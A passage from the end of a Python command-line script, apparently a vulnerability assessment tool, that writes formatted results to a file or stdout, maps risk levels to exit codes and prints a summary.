            output = format_results_json(results)
        else:
            output = format_results_report(results)
        
        # Write to file or stdout
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(output)
            print(f" Assessment results written to: {args.output}")
        else:
            print(output)
        
        # Exit with appropriate code based on risk level
        risk_to_exit_code = {
            'CRITICAL': 4,
            'HIGH': 3, 
            'MEDIUM': 2,
            'LOW': 1,
            'NONE': 0
        }
        
        exit_code = risk_to_exit_code.get(results.get('risk_level', 'NONE'), 0)
        
        # Print final summary
        vuln_count = results.get('vulnerability_summary', {}).get('total', 0)
        if vuln_count > 0:
            print(f"\n Assessment complete: {vuln_count} vulnerabilities found")
            print(f" Risk Level: {results.get('risk_level', 'UNKNOWN')}")
        else:
            print(f"\n Assessment complete: No vulnerabilities found")
            
        return exit_code
        
    except KeyboardInterrupt:
        print("\n️  Assessment interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Assessment failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    import sys
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
